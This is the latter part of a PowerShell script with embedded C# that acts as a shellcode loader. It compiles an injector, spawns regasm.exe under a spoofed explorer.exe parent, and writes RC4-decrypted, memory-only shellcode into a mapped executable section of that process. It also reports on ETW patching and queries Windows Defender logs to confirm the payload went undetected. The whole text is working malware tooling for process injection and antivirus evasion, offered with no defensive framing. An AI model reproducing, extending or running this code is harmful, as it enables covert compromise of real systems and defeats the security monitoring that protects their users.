                mc.ContextFlags = WOW64_CONTEXT_CONTROL;
                if (Wow64GetThreadContext(pi.hThread, ref mc)) eipTxt = "0x" + mc.Eip.ToString("X8");
                log.Add("ok|regasm alive at +" + (k * 2) + "s (EIP " + eipTxt + ", checkpoint " + k + "/5)");
            }
            if (exited)
            {
                log.Add("info|exit note: " + ExitNote(exitCode));
                log.Add("info|check Defender Protection History for an event naming this detection");
            }
            else
            {
                log.Add("ok|regasm survived the full 10 s monitor - no termination observed");
            }
        }

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        log.Add(bad ? "err|injection failed" : "ok|injection path complete - handles closed");
        return log.ToArray();
    }
}
'@

try {
    Add-Type -TypeDefinition $injSrc -ErrorAction Stop
    Log '+' 'injector compiled (csc)' 'DarkGreen'
}
catch {
    Log 'x' ("Add-Type failed: {0}" -f $_.Exception.Message) 'Red'
    exit 1
}

Log '[*]' ("spawning + staging (decrypt-on-write) {0} bytes ..." -f ($payload.Length - 4)) 'Gray'
$result = [HostExec]::Run($Target, $payload, $keyBytes)

[Array]::Clear($payload, 0, $payload.Length)
Log '[*]' 'local buffer zeroed (was ciphertext only)' 'DarkGray'

$hostPid   = $null
$alloc     = $null
$spoofTxt  = $null
$diedAt    = $null
$diedCode  = $null
$survived  = $false
$okCount   = 0
$errCount  = 0
foreach ($line in $result) {
    if ($line -match 'PID (\d+)')                                  { $hostPid = $Matches[1] }
    if ($line -match 'target view \(RX\) mapped into regasm @ (0x[0-9A-F]+)') { $alloc = $Matches[1] }
    if ($line -match 'parent-spoof handoff prepared')              { $spoofTxt = 'spoofed (explorer.exe parent)' }
    if ($line -match 'falling back to real parent')                { $spoofTxt = 'real parent (fallback)' }
    if ($line -match 'EXITED at ~\+(\d+)s - exit code (0x[0-9A-F]{1,8})') { $diedAt = $Matches[1]; $diedCode = $Matches[2] }
    if ($line -match 'survived the full 10 s monitor')             { $survived = $true }
    $tag, $msg = ($line -split '\|', 2)
    switch ($tag) {
        'ok'    { Log '+' $msg 'Green';    $okCount++ }
        'info'  { Log '[*]' $msg 'DarkGray' }
        'warn'  { Log '!' $msg 'Yellow' }
        'err'   { Log 'x' $msg 'Red';      $errCount++ }
        default { Log '[*]' $line 'Gray' }
    }
}

# ----------------------------------------------------------------------------
#  post-run verification: process state + Defender telemetry
# ----------------------------------------------------------------------------
$procState = 'n/a'
$defTxt    = 'n/a'
if ($hostPid) {
    Log '[*]' 'post-run verification (+3 s settle)' 'Cyan'
    Start-Sleep -Seconds 3
    $proc = Get-Process -Id ([int]$hostPid) -ErrorAction SilentlyContinue
    if ($proc) {
        $procState = 'regasm STILL RUNNING - process preserved'
        Log '+' ("regasm (PID {0}) STILL RUNNING - process preserved" -f $hostPid) 'Green'
    }
    else {
        $procState = 'regasm no longer running'
        Log '!' ("regasm (PID {0}) is no longer running" -f $hostPid) 'Yellow'
    }
    if (Test-Path -LiteralPath $Target) {
        Log '+' 'host binary on disk: present' 'Green'
    }
    else {
        Log '!' 'host binary on disk: MISSING (quarantined?)' 'Yellow'
    }
}

try {
    $h = @{
        LogName   = 'Microsoft-Windows-Windows Defender/Operational'
        Id        = 1006, 1015, 1116, 1117
        StartTime = (Get-Date).AddMinutes(-6)
    }
    $evts = @(Get-WinEvent -FilterHashtable $h -ErrorAction Stop)
    if ($evts.Count -eq 0) {
        $defTxt = 'no detection events in last 6 min'
        Log '+' 'Defender log: no detection events in the last 6 minutes' 'Green'
    }
    else {
        $defTxt = ("{0} event(s) in last 6 min" -f $evts.Count)
        Log '!' ("Defender log: {0} event(s) in the last 6 minutes:" -f $evts.Count) 'Red'
        foreach ($ev in ($evts | Select-Object -First 3)) {
            $m = ($ev.Message -replace '\s+', ' ')
            if ($m.Length -gt 180) { $m = $m.Substring(0, 180) }
            Log '!' ("  id {0}: {1}" -f $ev.Id, $m) 'Red'
        }
    }
}
catch {
    if ($_.Exception.Message -match 'No events') {
        $defTxt = 'no detection events in last 6 min'
        Log '+' 'Defender log: no detection events in the last 6 minutes' 'Green'
    }
    else {
        $defTxt = 'log unreadable'
        Log '!' ("Defender log not readable: {0}" -f $_.Exception.Message) 'Yellow'
    }
}

$verdict = if ($errCount -eq 0) { 'SUCCESS' } else { "FAILED ({0} error(s))" -f $errCount }
Write-Host ''
Write-Host '--------------------------- SUMMARY ---------------------------' -ForegroundColor Magenta
Write-Host ("  ETW      : {0}/4 export(s) patched" -f $patched)
Write-Host ("  cipher   : FDX1/RC4 - {0} bytes artifact -> {1} bytes shellcode" -f $payload.Length, ($payload.Length - 4))
Write-Host ("  fetch    : {0} bytes in {1} ms (ciphertext, memory only)" -f $payload.Length, $swFetch.ElapsedMilliseconds)
Write-Host ("  host     : {0}" -f $Target)
if ($spoofTxt) { Write-Host ("  lineage  : {0}" -f $spoofTxt) }
if ($hostPid)  { Write-Host ("  pid      : {0}" -f $hostPid) }
if ($alloc)    { Write-Host ("  rx view  : {0} (mapped section)" -f $alloc) }
if ($diedAt)   { Write-Host ("  monitor  : EXITED at +{0}s (code {1})" -f $diedAt, $diedCode) }
elseif ($survived) { Write-Host '  monitor  : alive through +10s' }
if ($procState -ne 'n/a') { Write-Host ("  post     : {0}" -f $procState) }
if ($defTxt -ne 'n/a')    { Write-Host ("  defender : {0}" -f $defTxt) }
Write-Host ("  verdict  : {0}" -f $verdict)
Write-Host '---------------------------------------------------------------' -ForegroundColor Magenta
Write-Host ''

if ($errCount -eq 0) { exit 0 } else { exit 1 }
